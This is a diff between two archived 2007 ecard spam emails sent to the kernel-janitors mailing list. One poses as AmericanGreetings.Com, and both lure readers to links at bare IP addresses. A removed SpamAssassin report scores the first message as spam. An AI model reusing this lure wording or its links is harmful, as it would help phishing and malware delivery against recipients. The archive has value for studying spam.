@@ -1,21 +1,16 @@
-From: "all-yours.net" <glq@kelsooil.com>
-Date: Wed, 04 Jul 2007 10:22:36 +0000
+From: "AmericanGreetings.Com" <pcr@soecon.ru>
+Date: Wed, 04 Jul 2007 13:28:41 +0000
 Subject: [KJ] Happy 4th of July
-Message-Id: <001301c7be25$3dc9a100$ed3d706c@ke.vo>
-MIME-Version: 1
-Content-Type: multipart/mixed; boundary="----------=_1183544559-3969-7"
+Message-Id: <002601c7be3f$3d062b20$972cceee@wyunw.yuo>
 List-Id: <kernel-janitors.vger.kernel.org>
+References: <001301c7be25$3dc9a100$ed3d706c@ke.vo>
+In-Reply-To: <001301c7be25$3dc9a100$ed3d706c@ke.vo>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
-This is a multi-part message in MIME format...
-
-------------=_1183544559-3969-7
-Content-Type: text/plain; format=flowed; charset="Windows-1252";
-	reply-type=original
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-Hi. Mate has sent you an ecard.
+Hi. Neighbour has sent you a greeting card.
 See your card as often as you wish during the next 15 days.
 
 SEEING YOUR CARD
@@ -23,7 +18,7 @@ SEEING YOUR CARD
 If your email software creates links to Web pages, click on your 
 card's direct www address below while you are connected to the Internet:
 
-http://69.205.167.239/?69c2b1c85da463c5c036b0339eb3a60
+http://87.242.15.46/?0b58e47d14c775ed2175ee0c2a4c1c8a8aa50
 
 Or copy and paste it into your browser's "Location" box (where Internet 
 addresses go).
@@ -31,7 +26,7 @@ addresses go).
 
 
 PRIVACY
-all-yours.net honors your privacy. Our home page and Card Pick Up have links to our 
+AmericanGreetings.Com honors your privacy. Our home page and Card Pick Up have links to our 
 Privacy Policy.
 
 TERMS OF USE
@@ -42,49 +37,10 @@ please disregard this Announcement.
 We hope you enjoy your awesome card.
 
 Wishing you the best,
-Administrator,
-all-yours.net
-
-
-------------=_1183544559-3969-7
-Content-Type: text/plain; name="SpamAssassinReport.txt"
-Content-Disposition: inline; filename="SpamAssassinReport.txt"
-Content-Transfer-Encoding: 7bit
-MIME-Version: 1.0
-X-Mailer: MIME-tools 5.419 (Entity 5.419)
-
-Spam detection software, running on the system "daredevil.linux-foundation.org", has
-identified this incoming email as possible spam.  The original message
-has been attached to this so you can view it (if it isn't spam) or label
-similar future email.  If you have any questions, see
-the administrator of that system for details.
-
-Content preview:  Hi. Mate has sent you an ecard. See your card as often
-  as you wish during the next 15 days. SEEING YOUR CARD If your email
-  software creates links to Web pages, click on your card's direct www
-  address below while you are connected to the Internet: [...] 
-
-Content analysis details:   (7.7 points, 5.0 required)
-
- pts rule name              description
----- ---------------------- --------------------------------------------------
- 3.8 HELO_DYNAMIC_HCC       Relay HELO'd using suspicious hostname (HCC)
- 3.8 HELO_DYNAMIC_IPADDR2   Relay HELO'd using suspicious hostname (IP addr
-                            2)
- 0.2 NORMAL_HTTP_TO_IP      URI: Uses a dotted-decimal IP address in URL
- 0.0 BAYES_50               BODY: Bayesian spam probability is 40 to 60%
-                            [score: 0.4976]
-
-
-
-------------=_1183544559-3969-7
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+Mailer-Daemon,
+AmericanGreetings.Com
 
 _______________________________________________
 Kernel-janitors mailing list
 Kernel-janitors@lists.linux-foundation.org
 https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
-------------=_1183544559-3969-7--
